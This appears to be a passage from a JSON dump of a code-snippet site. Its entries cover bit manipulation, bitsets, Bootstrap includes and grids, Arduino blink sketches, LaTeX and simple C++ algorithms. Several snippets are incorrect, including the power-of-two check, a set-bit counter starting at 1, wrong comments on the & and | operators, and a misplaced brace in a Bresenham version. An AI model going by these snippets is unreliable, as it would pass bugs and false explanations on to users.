use unsigned negation.  number ^= (-(unsigned long)x ^ number) & (1UL << n); or  unsigned long newbit = !!x;    // Also booleanize to force 0 or 1 number ^= (-newbit ^ number) & (1UL << n); It's generally a good idea to use unsigned types for portable bit manipulation.  or  number = (number & ~(1UL << n)) | (x << n); (number & ~(1UL << n)) will clear the nth bit and (x << n) will set the nth bit to x.  It's also generally a good idea to not to copy/paste code in general and so many people use preprocessor macros (like the community wiki answer further down) or some sort of encapsulation.\n",
    "reg_date": "2021-10-12T11:37:31.000Z"
  },
  {
    "id": 620,
    "keyword": null,
    "link": null,
    "title": " bit shift c++",
    "description": "int main() {     int val = 25;        //  011001 == 25     int lft = val << 1;  // 0110010 == 50     int rht = val >> 1;  //   01100 == 12 }\n",
    "reg_date": "2021-10-12T11:37:32.000Z"
  },
  {
    "id": 621,
    "keyword": null,
    "link": null,
    "title": " bitmap rotate 90 deg",
    "description": "Matrix matrix = new Matrix();  matrix.postRotate(90);  Bitmap scaledBitmap = Bitmap.createScaledBitmap(bitmapOrg, width, height, true);  Bitmap rotatedBitmap = Bitmap.createBitmap(scaledBitmap, 0, 0, scaledBitmap.getWidth(), scaledBitmap.getHeight(), matrix, true); \n",
    "reg_date": "2021-10-12T11:37:32.000Z"
  },
  {
    "id": 622,
    "keyword": null,
    "link": null,
    "title": " bitmapinfo structure",
    "description": "typedef struct tagBITMAPINFOHEADER {   DWORD biSize;   LONG  biWidth;   LONG  biHeight;   WORD  biPlanes;   WORD  biBitCount;   DWORD biCompression;   DWORD biSizeImage;   LONG  biXPelsPerMeter;   LONG  biYPelsPerMeter;   DWORD biClrUsed;   DWORD biClrImportant; } BITMAPINFOHEADER, *PBITMAPINFOHEADER; \n",
    "reg_date": "2021-10-12T11:37:32.000Z"
  },
  {
    "id": 623,
    "keyword": null,
    "link": null,
    "title": " bitmask c++",
    "description": "Bitwise Operator //if both are true then true else false & //if both are false then false else true | //changes true into false and vice-versa ~ //returns true if exactly one is true else false //checks if both are different ^ //a<<b multiply a with 2 , b times << //a>>b divide a with 2 ,  b times >> ------------------------------------------------- check whether a numbe is a power of 2 i.e if it comes in the format 2**n int x; cin >>x; cout<<~(x&(x-1)); ------------------------------------------------- count no of ones in the binary representation of th given number int count = 1; while(n!=0){     count++;     n = n&(n-1); } ------------------------------------------------- check whether the i'th bit is set or not i.e 1 for the binary of number n if(n & (1<<i) == true){     cout<<\"Yes it is a bit\" } ------------------------------------------------- \n- Set ith bit:    x|(1<<i)    1100 1100 |  0001 0000    (1<<i)   -----------    1101 1100      - Get ith bit:    (x&(1<<i) != 0)     0010 1100 &   0010 0000   (1<<i)   ------------     0010 0000   (is not zero)  - Clear ith bit:   x&(~(1<<i))                       ~ : inverts    0011 0110 &  1101 1111   ~(1<<i)   -----------    0001 0110\n",
    "reg_date": "2021-10-12T11:37:32.000Z"
  },
  {
    "id": 624,
    "keyword": null,
    "link": null,
    "title": " bitmask or cpp",
    "description": "Bitwise Operator //if both are true then true else false & //if both are false then false else true | //changes true into false and vice-versa ~ //returns true if exactly one is true else false //checks if both are different ^ //a<<b multiply a with 2 , b times << //a>>b divide a with 2 ,  b times >> ------------------------------------------------- check whether a numbe is a power of 2 i.e if it comes in the format 2**n int x; cin >>x; cout<<~(x&(x-1)); ------------------------------------------------- count no of ones in the binary representation of th given number int count = 1; while(n!=0){     count++;     n = n&(n-1); } ------------------------------------------------- check whether the i'th bit is set or not i.e 1 for the binary of number n if(n & (1<<i) == true){     cout<<\"Yes it is a bit\" } ------------------------------------------------- \n- Set ith bit:    x|(1<<i)    1100 1100 |  0001 0000    (1<<i)   -----------    1101 1100      - Get ith bit:    (x&(1<<i) != 0)     0010 1100 &   0010 0000   (1<<i)   ------------     0010 0000   (is not zero)  - Clear ith bit:   x&(~(1<<i))                       ~ : inverts    0011 0110 &  1101 1111   ~(1<<i)   -----------    0001 0110\n",
    "reg_date": "2021-10-12T11:37:32.000Z"
  },
  {
    "id": 625,
    "keyword": null,
    "link": null,
    "title": " bits/stdc++.h in c++",
    "description": "<string>, <iostream> and <vector>\n",
    "reg_date": "2021-10-12T11:37:32.000Z"
  },
  {
    "id": 626,
    "keyword": null,
    "link": null,
    "title": " bits/stdc++ clang",
    "description": "/** @file stdc++.h  *  This is an implementation file for a precompiled header.   */   using namespace std;     // 17.4.1.2 Headers    // C   #ifndef _GLIBCXX_NO_ASSERT   #include <cassert>   #endif   #include <cctype>   #include <cerrno>   #include <cfloat>   #include <ciso646>   #include <climits>   #include <clocale>   #include <cmath>   #include <csetjmp>   #include <csignal>   #include <cstdarg>   #include <cstddef>   #include <cstdio>   #include <cstdlib>   #include <cstring>   #include <ctime>    #if __cplusplus >= 201103L   #include <ccomplex>   #include <cfenv>   #include <cinttypes>   #include <cstdbool>   #include <cstdint>   #include <ctgmath>   #include <cwchar>   #include <cwctype>   #endif    // C++   #include <algorithm>   #include <bitset>   #include <complex>   #include <deque>   #include <exception>   #include <fstream>   #include <functional>   #include <iomanip>   #include <ios>   #include <iosfwd>   #include <iostream>   #include <istream>   #include <iterator>   #include <limits>   #include <list>   #include <locale>   #include <map>   #include <memory>   #include <new>   #include <numeric>   #include <ostream>   #include <queue>   #include <set>   #include <sstream>   #include <stack>   #include <stdexcept>   #include <streambuf>   #include <string>   #include <typeinfo>   #include <utility>   #include <valarray>   #include <vector>    #if __cplusplus >= 201103L   #include <array>   #include <atomic>   #include <chrono>   #include <condition_variable>   #include <forward_list>   #include <future>   #include <initializer_list>   #include <mutex>   #include <random>   #include <ratio>   #include <regex>   #include <scoped_allocator>   #include <system_error>   #include <thread>   #include <tuple>   #include <typeindex>   #include <type_traits>   #include <unordered_map>   #include <unordered_set>   #endif  \n",
    "reg_date": "2021-10-12T11:37:32.000Z"
  },
  {
    "id": 627,
    "keyword": null,
    "link": null,
    "title": " bitset c++",
    "description": "// Instantiating and printing a bitset  #include <iostream> #include <bitset>  int main() {   \t// A bitset. The size must be able to be determined   \t// at compile time.   \t//   \t// The bitset can be set using a number or a string \tstd::bitset<8> byte1 = bitset<8>(97);   \tstd::bitset<8> byte2 = bitset<8>(\"0001101\")      \tstd::cout << byte1; // Output: 01100001 }\n< Bitset > The C++ standard library also provides the bitset structure, which corresponds to an array whose each value is either 0 or 1.       string s1 = bitset<8>(6).to_string(); //convert number to binary string   cout<<s1<<endl; //00000110   string s2 = \"110010\";    bitset<8> b1(s2);   // [0, 0, 1, 1, 0, 0, 1, 0]    cout << b1.count(); //3\n// constructing bitsets #include <iostream>       // std::cout #include <string>         // std::string #include <bitset>         // std::bitset  int main () {   std::bitset<16> foo;   std::bitset<16> bar (0xfa2);   std::bitset<16> baz (std::string(\"0101111001\"));    std::cout << \"foo: \" << foo << '\\n';   std::cout << \"bar: \" << bar << '\\n';   std::cout << \"baz: \" << baz << '\\n';    return 0; }\n",
    "reg_date": "2021-10-12T11:37:32.000Z"
  },
  {
    "id": 628,
    "keyword": null,
    "link": null,
    "title": " bitset declaration c++",
    "description": "// constructing bitsets #include <iostream>       // std::cout #include <string>         // std::string #include <bitset>         // std::bitset  int main () {   std::bitset<16> foo;   std::bitset<16> bar (0xfa2);   std::bitset<16> baz (std::string(\"0101111001\"));    std::cout << \"foo: \" << foo << '\\n';   std::cout << \"bar: \" << bar << '\\n';   std::cout << \"baz: \" << baz << '\\n';    return 0; }\n",
    "reg_date": "2021-10-12T11:37:32.000Z"
  },
  {
    "id": 629,
    "keyword": null,
    "link": null,
    "title": " bitwise count total set bits",
    "description": "countBits = (n) => n.toString(2).split(\"0\").join(\"\").length;\n//WAP to find setbits (total 1's in binary ex. n= 5 => 101 => 2 setbits int count{}, num{};   cin >> num;    while (num > 0) {     count = count + (num & 1); // num&1 => it gives either 0 or 1     num = num >> 1;\t// bitwise rightshift    }  \t cout << count; //count is our total setbits  \n",
    "reg_date": "2021-10-12T11:37:32.000Z"
  },
  {
    "id": 630,
    "keyword": null,
    "link": null,
    "title": " bitwise operators explanation in c++",
    "description": "The & (bitwise AND) in C or C++ takes two numbers as operands and does AND on every bit of two numbers. The result of AND is 1 only if both bits are 1. The | (bitwise OR) in C or C++ takes two numbers as operands and does OR on every bit of two numbers. The result of OR is 1 if any of the two bits is 1. The ^ (bitwise XOR) in C or C++ takes two numbers as operands and does XOR on every bit of two numbers. The result of XOR is 1 if the two bits are different. The << (left shift) in C or C++ takes two numbers, left shifts the bits of the first operand, the second operand decides the number of places to shift. The >> (right shift) in C or C++ takes two numbers, right shifts the bits of the first operand, the second operand decides the number of places to shift. The ~ (bitwise NOT) in C or C++ takes one number and inverts all bits of it\n",
    "reg_date": "2021-10-12T11:37:33.000Z"
  },
  {
    "id": 631,
    "keyword": null,
    "link": null,
    "title": " blink arduino",
    "description": "void setup() {   LED_BUILTIN = 3; //or 13    // initialize digital pin LED_BUILTIN as an output.   pinMode(LED_BUILTIN, OUTPUT);  }  // the loop function runs over and over again forever void loop() {   digitalWrite(LED_BUILTIN, HIGH);   // turn the LED on (HIGH is the voltage level)   delay(1000);                       // wait for a second   digitalWrite(LED_BUILTIN, LOW);    // turn the LED off by making the voltage LOW   delay(1000);                       // wait for a second }\nvoid setup() {   // initialize digital pin LED_BUILTIN as an output.   pinMode(LED_BUILTIN, OUTPUT); }  // the loop function runs over and over again forever void loop() {   digitalWrite(LED_BUILTIN, HIGH);   // turn the LED on (HIGH is the voltage level)   delay(1000);                       // wait for a second   digitalWrite(LED_BUILTIN, LOW);    // turn the LED off by making the voltage LOW   delay(1000);                       // wait for a second }\nplease subscribe my channel - https://bit.ly/2Me2CfB  void setup() {   pinMode(LED_BUILTIN, OUTPUT); }  void loop() {   digitalWrite(LED_BUILTIN, HIGH);   delay(100);   digitalWrite(LED_BUILTIN, LOW);   delay(100); }\nvoid setup() {   pinMode(ledPin, OUTPUT); }  \n",
    "reg_date": "2021-10-12T11:37:33.000Z"
  },
  {
    "id": 632,
    "keyword": null,
    "link": null,
    "title": " blink led on esp8266",
    "description": "int LED = 5; // Assign LED pin i.e: D1 on NodeMCU  void setup() {  // initialize GPIO 5 as an output  pinMode(LED, OUTPUT);  }  // the loop function runs over and over again forever  void loop() {  digitalWrite(LED, HIGH); // turn the LED on delay(1000); // wait for a second digitalWrite(LED, LOW); // turn the LED off delay(1000); // wait for a second  }\n",
    "reg_date": "2021-10-12T11:37:33.000Z"
  },
  {
    "id": 633,
    "keyword": null,
    "link": null,
    "title": " blood type compatibility",
    "description": "#include<iostream> #include<string> bool Bool_type(const std::string& Recipient,const std::string& Donor); int main(){   std::cout<<\"Please enter the blood type of the recipient:\\t \";   std::string Recipient;   std::cin>>Recipient;   std::cout<<\"Please enter the blood type of the donor:\\t \";   std::string Donor;   std::cin>>Donor;   int R{0};   int D {0};   for(const char& c:Recipient)R+=c;   for(const char& c:Donor)D+=c;   if(R!=110&&R!=108&&R!=109&&R!=111&&R!=174&&R!=176&&R!=122&&R!=124){     std::cerr<<\"Invalid input\"<<std::endl;     return 0;   }   if(D!=110&&D!=108&&D!=109&&D!=111&&D!=174&&D!=176&&D!=122&&D!=124){     std::cerr<<\"Invalid input\"<<std::endl;     return 0;   }else{         std::cout<<std::boolalpha<<Bool_type(Recipient,Donor);   }   std::cout<<std::endl;   return 0; } bool Bool_type(const std::string& Recipient,const std::string& Donor){     if(Recipient == \"A+\"){         if(Donor == \"A+\"|| Donor ==\"A-\" || Donor == \"O+\" || Donor == \"O-\"){return true;}     }else if(Recipient ==\"A-\"){         if(Donor == \"A-\" || Donor == \"O-\"){return true;}     }else if(Recipient == \"B+\"){         if(Donor ==\"B+\"||Donor == \"B-\"|| Donor == \"O-\" || Donor == \"O+\"){return true;}     }else if(Recipient == \"B-\"){         if (Donor == \"B-\"|| Donor == \"O-\") {return true;}     }else if(Recipient == \"AB+\"){         if(Donor==\"A+\"||Donor ==\"A-\"||Donor==\"B+\"||Donor== \"B-\"||Donor==\"AB+\"||Donor==\"AB-\"||Donor==\"O+\"||Donor == \"O-\"){return true;}     }else if(Recipient == \"AB-\"){         if(Donor==\"AB-\"||Donor==\"A-\"||Donor==\"B-\"||Donor==\"O-\"){return true;}     }else if(Recipient==\"O+\"){         if(Donor==\"O+\"||Donor==\"O-\"){return true;}     }else if(Recipient == \"O-\"){         if(Donor==\"O-\"){return true;}     }   return false; }\n",
    "reg_date": "2021-10-12T11:37:33.000Z"
  },
  {
    "id": 634,
    "keyword": null,
    "link": null,
    "title": " bold text latex",
    "description": "\\textbf{}\n\\textbf{text}\n\\textbf{accident}\n\\textbf{\\textit{text}} \n\\documentclass{article}  \\makeatletter \\DeclareRobustCommand\\bfseriesitshape{%   \\not@math@alphabet\\itshapebfseries\\relax   \\fontseries\\bfdefault   \\fontshape\\itdefault   \\selectfont } \\makeatother  \\DeclareTextFontCommand{\\textbfit}{\\bfseriesitshape}  \\begin{document}  \\scshape % now the current font shape is small caps  \\textit{\\textbf{f}}f  \\textbf{\\textit{f}}f %% causes LaTeX Font Warning  {\\fontseries\\bfdefault\\textit{f}f}  \\textbfit{f}f  \\end{document} \n\\textit{\\textbf{text}} \n",
    "reg_date": "2021-10-12T11:37:33.000Z"
  },
  {
    "id": 635,
    "keyword": null,
    "link": null,
    "title": " bool function in c++",
    "description": "bool isCodingFun = true; bool isFishTasty = false; cout << isCodingFun;  // Outputs 1 (true) cout << isFishTasty;  // Outputs 0 (false)  //credit to w3schools.com\n#include<stdio.h> #include <stdbool.h> main() {      bool value = true;     (value) ? printf(\"value is true\"): printf(\"value is false\"); }\nbool Divisible(int a, int b) {     return (a % b) == 0; }\nbool Divisible(int a, int b) {     return !(a % b); }\nbool Divisible(int a, int b) {     int remainder = a % b; // Calculate the remainder of a and b.      if(remainder == 0) {         return true; //If the remainder is 0, the numbers are divisible.     } else {         return false; // Otherwise, they aren't.     } }\n   bool isCodingFun = true; bool isFishTasty = false; cout << isCodingFun;     // Outputs 1 (true) cout << isFishTasty;  // Outputs 0 (false) \n",
    "reg_date": "2021-10-12T11:37:33.000Z"
  },
  {
    "id": 636,
    "keyword": null,
    "link": null,
    "title": " bool to string arduino",
    "description": "YourVariable.tostring();\nString(yourVariable);\n",
    "reg_date": "2021-10-12T11:37:33.000Z"
  },
  {
    "id": 637,
    "keyword": null,
    "link": null,
    "title": " boolean in cpp",
    "description": "bool isCodingFun = true; bool isFishTasty = false; cout << isCodingFun;  // Outputs 1 (true) cout << isFishTasty;  // Outputs 0 (false)  //credit to w3schools.com\n#include<stdio.h> #include <stdbool.h> main() {      bool value = true;     (value) ? printf(\"value is true\"): printf(\"value is false\"); }\nbool Divisible(int a, int b) {     return (a % b) == 0; }\nbool Divisible(int a, int b) {     return !(a % b); }\nbool Divisible(int a, int b) {     int remainder = a % b; // Calculate the remainder of a and b.      if(remainder == 0) {         return true; //If the remainder is 0, the numbers are divisible.     } else {         return false; // Otherwise, they aren't.     } }\n   bool isCodingFun = true; bool isFishTasty = false; cout << isCodingFun;     // Outputs 1 (true) cout << isFishTasty;  // Outputs 0 (false) \n",
    "reg_date": "2021-10-12T11:37:33.000Z"
  },
  {
    "id": 638,
    "keyword": null,
    "link": null,
    "title": " bootstrap",
    "description": "<!-- CSS only --> <link rel=\"stylesheet\" href=\"https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css\" integrity=\"sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk\" crossorigin=\"anonymous\">  <!-- JS, Popper.js, and jQuery --> <script src=\"https://code.jquery.com/jquery-3.5.1.slim.min.js\" integrity=\"sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj\" crossorigin=\"anonymous\"></script> <script src=\"https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js\" integrity=\"sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo\" crossorigin=\"anonymous\"></script> <script src=\"https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js\" integrity=\"sha384-OgVRvuATP1z7JjHLkuOU7Xw704+h835Lr+6QL9UvYjZE3Ipu6Tp75j7Bh/kR0JKI\" crossorigin=\"anonymous\"></script>\n<script src=\"https://code.jquery.com/jquery-3.5.1.slim.min.js\" integrity=\"sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj\" crossorigin=\"anonymous\"></script> <script src=\"https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js\" integrity=\"sha384-9/reFTGAW83EW2RDu2S0VKaIzap3H66lZH81PoYlFhbGU+6BZp6G7niu735Sk7lN\" crossorigin=\"anonymous\"></script> <script src=\"https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js\" integrity=\"sha384-+YQ4JLhjyBLPDQt//I+STsc9iw4uQqACwlvpslubQzn4u2UU2UFM80nGisd026JF\" crossorigin=\"anonymous\"></script> \n<!-- CSS only --> <link rel=\"stylesheet\" href=\"https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css\" integrity=\"sha384-JcKb8q3iqJ61gNV9KGb8thSsNjpSL0n8PARn9HuZOnIxN0hoP+VmmDGMN5t9UJ0Z\" crossorigin=\"anonymous\">  <!-- JS, Popper.js, and jQuery --> <script src=\"https://code.jquery.com/jquery-3.5.1.slim.min.js\" integrity=\"sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj\" crossorigin=\"anonymous\"></script> <script src=\"https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js\" integrity=\"sha384-9/reFTGAW83EW2RDu2S0VKaIzap3H66lZH81PoYlFhbGU+6BZp6G7niu735Sk7lN\" crossorigin=\"anonymous\"></script> <script src=\"https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js\" integrity=\"sha384-B4gt1jrGC7Jh4AgTPSdUtOBvfO8shuf57BaghqFfPlYxofvL8/KUEfYiJOMMV+rV\" crossorigin=\"anonymous\"></script>\n<link href=\"https://cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/css/bootstrap.min.css\" rel=\"stylesheet\" integrity=\"sha384-+0n0xVW2eSR5OomGNYDnhzAbDsOXxcvSN1TPprVMTNDbiYZCxYbOOl7+AMvyTG2x\" crossorigin=\"anonymous\"> \n<script src=\"https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js\" integrity=\"sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM\" crossorigin=\"anonymous\"></script>\n<!-- jsDelivr --> <!-- CSS only --> <link href=\"https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta2/dist/css/bootstrap.min.css\" rel=\"stylesheet\" integrity=\"sha384-BmbxuPwQa2lc/FVzBcNJ7UAyJxM6wuqIj61tLrc4wSX0szH/Ev+nYRRuWlolflfl\" crossorigin=\"anonymous\"> <!-- JavaScript Bundle with Popper --> <script src=\"https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta2/dist/js/bootstrap.bundle.min.js\" integrity=\"sha384-b5kHyXgcpbZJO/tY9Ul7kGkf1S0CWuKcCD38l8YkeH8z8QjE0GmW1gYU5S9FOnJ0\" crossorigin=\"anonymous\"></script>\n# Installation npm install bootstrap@next\n<!doctype html> <html lang=\"en\">   <head>     <!-- Required meta tags -->     <meta charset=\"utf-8\">     <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">      <!-- Bootstrap CSS -->     <link href=\"https://cdn.jsdelivr.net/npm/bootstrap@5.1.0/dist/css/bootstrap.min.css\" rel=\"stylesheet\" integrity=\"sha384-KyZXEAg3QhqLMpG8r+8fhAXLRk2vvoC2f3B09zVXn8CA5QIVfZOJ3BCsw2P0p/We\" crossorigin=\"anonymous\">      <title>Hello, world!</title>   </head>   <body>           <!-- Option 1: Bootstrap Bundle with Popper -->     <script src=\"https://cdn.jsdelivr.net/npm/bootstrap@5.1.0/dist/js/bootstrap.bundle.min.js\" integrity=\"sha384-U1DAWAznBHeqEIlVSCgzq+c9gqGAJn5c/t99JyeKa9xxaYpSvHU5awsuZVVFIhvj\" crossorigin=\"anonymous\"></script>    </body> </html> \n<link rel=\"stylesheet\" href=\"https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css\" integrity=\"sha384-TX8t27EcRE3e/ihU7zmQxVncDAy5uIKz4rEkgIXeMed4M0jlfIDPvg6uqKI2xXr2\" crossorigin=\"anonymous\"> <script src=\"https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js\"></script> <!-- <script src=\"https://code.jquery.com/jquery-3.5.1.slim.min.js\" integrity=\"sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj\" crossorigin=\"anonymous\"></script> --> <script src=\"https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js\" integrity=\"sha384-ho+j7jyWK8fNQe+A12Hb8AhRq26LrZ/JpcUGGOn+Y7RsweNrtN/tE3MoK7ZeZDyx\" crossorigin=\"anonymous\"></script>\n<link rel=\"stylesheet\" href=\"https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css\" integrity=\"sha384-B0vP5xmATw1+K9KRQjQERJvTumQW0nPEzvF6L/Z6nronJ3oUOFUFpCjEUQouq2+l\" crossorigin=\"anonymous\"> \n",
    "reg_date": "2021-10-12T11:37:34.000Z"
  },
  {
    "id": 639,
    "keyword": null,
    "link": null,
    "title": " bootstrap grid",
    "description": "<!- BOOTSTRAP GRID SYSTEM ------------------------> Extra small  .col-    <576px\tMobile Display Small  .col-sm- &ge;576px\tMobile Display Medium .col-md- &ge;768px\tTablet Display Large  .col-lg-  &ge;992px\tDesktop Display Extra large .col-xl- &ge;1200px Desktop Display    <div class=\"row\">     <div class=\"col-lg-3 col-md-4 col-sm-6\" style=\"background-color:red; border:1px solid black;\">       One of four columns     </div>     <div class=\"col-lg-3 col-md-4 col-sm-6\" style=\"background-color:yellow; border:1px solid black;\">       One of four columns     </div>     <div class=\"col-lg-3 col-md-4 col-sm-6\" style=\"background-color:green; border:1px solid black;\">       One of four columns   \t</div>     <div class=\"col-lg-3 col-md-4 col-sm-6\" style=\"border:1px solid black;\">       One of four columns   \t</div>   </div> \nThe Bootstrap grid system has four classes: xs (for phones - screens less than 768px wide) sm (for tablets - screens equal to or greater than 768px wide) md (for small laptops - screens equal to or greater than 992px wide) lg (for laptops and desktops - screens equal to or greater than 1200px wide)\n<div class=\"container\">   <div class=\"row\">     <div class=\"col align-self-start\">       One of three columns     </div>     <div class=\"col align-self-center\">       One of three columns     </div>     <div class=\"col align-self-end\">       One of three columns     </div>   </div> </div>\n<div class=\"container\">   <div class=\"row\">     <div class=\"col\">       1 of 3     </div>     <div class=\"col-6\">       2 of 3 (wider)     </div>     <div class=\"col\">       3 of 3     </div>   </div>   <div class=\"row\">     <div class=\"col\">       1 of 3     </div>     <div class=\"col-5\">       2 of 3 (wider)     </div>     <div class=\"col\">       3 of 3     </div>   </div> </div>\n <!----------------------- BOOTSTRAP GRID SYSTEM ------------------------>  This code will create 4 boxes placed side by side, which will be  dynamically positioned, according to the size of the screen. We define  the following behavior:    <!-- Desktop Display: we have 4 columns per row (each occupies 3 units out of 12)  -->  class = \"col-lg-3\"   <!-- display large with 12/3 = 4 columns -->   <!-- Tablet Display: we have 3 columns per row (each occupies 4 units out of 12)  -->  class = \"col-md-4\"   <!-- display medium with 12/4 = 3 columns -->   <!-- Mobile Display: we have 2 columns per row (each occupies the 6 units of 12)  -->  class = \"col-sm-6\"  <!-- display small with 12/6 = 2 columns -->   <!-- CODE -->    <div class=\"row\">     <div class=\"col-lg-3 col-md-4 col-sm-6\" style=\"background-color:red; border:1px solid black;\">       One of four columns     </div>     <div class=\"col-lg-3 col-md-4 col-sm-6\" style=\"background-color:yellow; border:1px solid black;\">       One of four columns     </div>     <div class=\"col-lg-3 col-md-4 col-sm-6\" style=\"background-color:green; border:1px solid black;\">       One of four columns   \t</div>     <div class=\"col-lg-3 col-md-4 col-sm-6\" style=\"border:1px solid black;\">       One of four columns   \t</div>   </div> \n<div class=\"container\">   <div class=\"row justify-content-start\">     <div class=\"col-4\">       One of two columns     </div>     <div class=\"col-4\">       One of two columns     </div>   </div>   <div class=\"row justify-content-center\">     <div class=\"col-4\">       One of two columns     </div>     <div class=\"col-4\">       One of two columns     </div>   </div>   <div class=\"row justify-content-end\">     <div class=\"col-4\">       One of two columns     </div>     <div class=\"col-4\">       One of two columns     </div>   </div>   <div class=\"row justify-content-around\">     <div class=\"col-4\">       One of two columns     </div>     <div class=\"col-4\">       One of two columns     </div>   </div>   <div class=\"row justify-content-between\">     <div class=\"col-4\">       One of two columns     </div>     <div class=\"col-4\">       One of two columns     </div>   </div> </div>\n",
    "reg_date": "2021-10-12T11:37:34.000Z"
  },
  {
    "id": 640,
    "keyword": null,
    "link": null,
    "title": " border radius layout android xml",
    "description": "<?xml version=\"1.0\" encoding=\"UTF-8\"?> <shape xmlns:android=\"http://schemas.android.com/apk/res/android\">     <solid android:color=\"#FFFFFF\"/>     <stroke android:width=\"3dp\" android:color=\"#B1BCBE\" />     <corners android:radius=\"10dp\"/>     <padding android:left=\"0dp\" android:top=\"0dp\" android:right=\"0dp\" android:bottom=\"0dp\" /> </shape>\n",
    "reg_date": "2021-10-12T11:37:34.000Z"
  },
  {
    "id": 641,
    "keyword": null,
    "link": null,
    "title": " bounded and unbounded solution in lpp",
    "description": "A solution region of a system of linear inequalities is A solution region of a system of linear inequalities is bounded if it can be enclosed within a circle. If it cannot be enclosed within a circle, it is unbounded.\n",
    "reg_date": "2021-10-12T11:37:34.000Z"
  },
  {
    "id": 642,
    "keyword": null,
    "link": null,
    "title": " bracket balancing c++",
    "description": "/* PARENTHESE MATCHING AUTHOR: UTKARSH SINHA */ bool correct_paranthesis(string str){ \tstack<char> stk; \tmap<char,char> bracket_map; \tbracket_map[')'] = '('; \tbracket_map['}'] = '{'; \tbracket_map[']'] = '['; \t \tfor(int i=0; i<str.size(); i++){ \t\tif(str[i] == '(' || str[i] == '{' || str[i] == '[') \t\t\tstk.push(str[i]); \t\tif(str[i] == ')' || str[i] == '}' || str[i] == ']'){ \t\t\tif(stk.empty()) \t\t\t\treturn false; \t\t\tif(stk.top() == bracket_map[str[i]] ) \t\t\t\tstk.pop(); \t\t} \t} \t \treturn (stk.empty() == true); }\n",
    "reg_date": "2021-10-12T11:37:34.000Z"
  },
  {
    "id": 643,
    "keyword": null,
    "link": null,
    "title": " break in c++",
    "description": "break; statement helps in coming out of the current loop Further in case of nested loop it gets you out of the innermost loop.\n",
    "reg_date": "2021-10-12T11:37:34.000Z"
  },
  {
    "id": 644,
    "keyword": null,
    "link": null,
    "title": " break input stream into words",
    "description": "int countWords(string str) {     stringstream s(str);     string word;     int count = 0;     while (s >> word)         count++;     return count; }\n",
    "reg_date": "2021-10-12T11:37:34.000Z"
  },
  {
    "id": 645,
    "keyword": null,
    "link": null,
    "title": " bresenham's line algorithm c++",
    "description": "void drawline(int x0, int y0, int x1, int y1)   {       int dx, dy, p, x, y;       dx=x1-x0;       dy=y1-y0;       x=x0;       y=y0;       p=2*dy-dx;       while(x<x1)       {           if(p>=0)           {               putpixel(x,y,7);               y=y+1;               p=p+2*dy-2*dx;            \tx+=1;         }           else           {               putpixel(x,y,7);               p=p+2*dy;}               x+=1;           }   }  \n#include<iostream.h> #include<graphics.h>   void drawline(int x0, int y0, int x1, int y1) {     int dx, dy, p, x, y;   \tdx=x1-x0; \tdy=y1-y0;   \tx=x0; \ty=y0;   \tp=2*dy-dx;   \twhile(x<x1) \t{ \t\tif(p>=0) \t\t{ \t\t\tputpixel(x,y,7); \t\t\ty=y+1; \t\t\tp=p+2*dy-2*dx; \t\t} \t\telse \t\t{ \t\t\tputpixel(x,y,7); \t\t\tp=p+2*dy; \t\t} \t\tx=x+1; \t} }   int main() { \tint gdriver=DETECT, gmode, error, x0, y0, x1, y1; \tinitgraph(&gdriver, &gmode, \"c:\\\\turboc3\\\\bgi\");   \tcout<<\"Enter co-ordinates of first point: \"; \tcin>>x0>>y0;   \tcout<<\"Enter co-ordinates of second point: \"; \tcin>>x1>>y1; \tdrawline(x0, y0, x1, y1);   \treturn 0; } \nstatic void bresenham(int x1, int y1, int x2, int y2)      {          int m_new = 2 * (y2 - y1);          int slope_error_new = m_new - (x2 - x1);                 for (int x = x1, y = y1; x <= x2; x++)          {              System.out.print(\"(\" +x + \",\" + y + \")\\n\");                 // Add slope to increment angle formed              slope_error_new += m_new;                 // Slope error reached limit, time to              // increment y and update slope error.              if (slope_error_new >= 0)              {                  y++;                  slope_error_new -= 2 * (x2 - x1);              }          }      }\n",
    "reg_date": "2021-10-12T11:37:34.000Z"
  },
  {
    "id": 646,
    "keyword": null,
    "link": null,
    "title": " bridge in a graph",
